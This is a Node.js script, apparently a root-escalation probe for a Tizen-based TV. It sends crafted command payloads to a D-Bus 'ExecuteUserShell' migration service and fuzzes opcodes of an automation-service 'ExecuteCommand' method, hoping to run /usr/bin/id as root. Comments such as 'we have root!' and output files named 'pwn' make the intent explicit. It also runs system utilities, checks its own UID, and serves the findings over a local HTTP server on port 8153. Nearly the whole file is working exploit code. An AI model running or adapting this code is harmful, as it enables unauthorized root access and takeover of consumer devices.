'use strict';
var http = require('http');
var fs = require('fs');
var cp = require('child_process');

var PORT = 8153;
var PROBE_FILE = '/home/owner/share/tmp/sdk_tools/tbprobe65h.txt';

var INNER = [
  'var fs = require("fs");',
  'var cp = require("child_process");',
  'var result = {};',

  // HIGHEST PRIORITY: ExecuteUserShell JSON with absolute paths
  // v63h showed {"cmd":"id"} → exit 127 (shell ran, id not in PATH)
  // Now try absolute paths — if {"cmd":"/usr/bin/id"} works, we have root!
  'var jcmds = [',
  '  \'{"cmd":"/usr/bin/id"}\',',
  '  \'{"cmd":"/bin/sh","args":["-c","/usr/bin/id"]}\',',
  '  \'{"cmd":"/bin/sh","args":["-c","/usr/bin/id > /tmp/pwn.txt 2>&1"]}\',',
  '  \'{"cmd":"/bin/sh","args":["-c","/usr/bin/id > /home/owner/share/tmp/sdk_tools/pwn65.txt 2>&1"]}\',',
  '  \'{"type":"exec","path":"/usr/bin/id","args":[]}\',',
  '  \'{"action":"exec","cmd":"/usr/bin/id"}\',',
  '  \'{"run":"/usr/bin/id"}\',',
  '  \'{"command":"/usr/bin/id"}\',',
  '  \'["/bin/sh","-c","/usr/bin/id > /tmp/pwn.txt 2>&1"]\'',
  '];',
  'result.jackpack_json = {};',
  'jcmds.forEach(function(cmd){',
  '  var key = cmd.slice(0,45);',
  '  try {',
  '    var r = cp.spawnSync("dbus-send", [',
  '      "--system","--dest=com.jackpack.migration",',
  '      "--type=method_call","--print-reply",',
  '      "/com/jackpack/migration",',
  '      "com.jackpack.migration.ExecuteUserShell",',
  '      "string:" + cmd',
  '    ], {timeout:5000});',
  '    result.jackpack_json[key] = {',
  '      out: r.stdout ? r.stdout.toString().trim() : "",',
  '      err: r.stderr ? r.stderr.toString().slice(0,80) : "",',
  '      status: r.status',
  '    };',
  '  } catch(e) {',
  '    result.jackpack_json[key+"_e"] = e.message.slice(0,60);',
  '  }',
  '});',

  // Check for pwn files from above
  'try { result.pwn_txt = fs.readFileSync("/tmp/pwn.txt","utf8"); } catch(e) { result.pwn_txt_err = e.message; }',
  'try { result.pwn65 = fs.readFileSync("/home/owner/share/tmp/sdk_tools/pwn65.txt","utf8"); } catch(e) { result.pwn65_err = e.message; }',

  // SECONDARY: ExecuteCommand opcodes 0-5 (kept short)
  'result.exec_cmd_map = {};',
  '[0,1,2,3,4,5].forEach(function(op){',
  '  try {',
  '    var r2 = cp.spawnSync("dbus-send", [',
  '      "--system","--dest=org.tizen.tv.automation-service",',
  '      "--type=method_call","--print-reply",',
  '      "/TIFacAutoObj",',
  '      "org.tizen.tv.automationservice.ExecuteCommand",',
  '      "int32:"+op, "int32:0"',
  '    ], {timeout:4000});',
  '    result.exec_cmd_map["op"+op] = {',
  '      out: r2.stdout ? r2.stdout.toString().trim() : "",',
  '      status: r2.status',
  '    };',
  '  } catch(e) { result.exec_cmd_map["op"+op] = "err"; }',
  '});',

  // TERTIARY: wasutility — just two most likely useful commands
  'try {',
  '  var rw1 = cp.spawnSync("/usr/bin/wasutility", ["list"], {timeout:3000});',
  '  result.wasutil_list = {out: rw1.stdout ? rw1.stdout.toString() : "", err: rw1.stderr ? rw1.stderr.toString() : "", s: rw1.status};',
  '} catch(e) { result.wasutil_list_err = e.message; }',
  'try {',
  '  var rw2 = cp.spawnSync("/usr/bin/wasutility", ["status"], {timeout:3000});',
  '  result.wasutil_status = {out: rw2.stdout ? rw2.stdout.toString() : "", err: rw2.stderr ? rw2.stderr.toString() : "", s: rw2.status};',
  '} catch(e) { result.wasutil_status_err = e.message; }',

  // Self UID check
  'try {',
  '  var selfSt = fs.readFileSync("/proc/self/status","utf8");',
  '  result.self_uid = (selfSt.match(/^Uid:\\s*(\\S+)/m)||[])[1];',
  '} catch(e) {}',

  'var out = JSON.stringify(result, null, 2);',
  'try { require("fs").writeFileSync("' + PROBE_FILE + '", out); } catch(e) {}',
  'process.stdout.write(out);'
].join('\n');

var cachedResult = null;

function runProbe(cb) {
  // Return cached result immediately if available
  if (cachedResult) { cb(cachedResult); return; }
  // Check probe file from initial run
  try {
    var existing = fs.readFileSync(PROBE_FILE, 'utf8');
    if (existing && existing.length > 10) { cachedResult = existing; cb(cachedResult); return; }
  } catch(e) {}
  cp.execFile(process.execPath, ['-e', INNER], { timeout: 120000 }, function(err, stdout, stderr) {
    var r;
    if (err) {
      r = JSON.stringify({ exec_error: err.message, stderr: stderr, stdout: stdout || '' });
    } else {
      r = stdout || '(empty)';
    }
    cachedResult = r;
    cb(r);
  });
}

var server = http.createServer(function(req, res) {
  runProbe(function(result) {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(result);
  });
});

server.listen(PORT, function() {
  runProbe(function(result) {
    try { fs.writeFileSync(PROBE_FILE, result); } catch(e) {}
  });
});
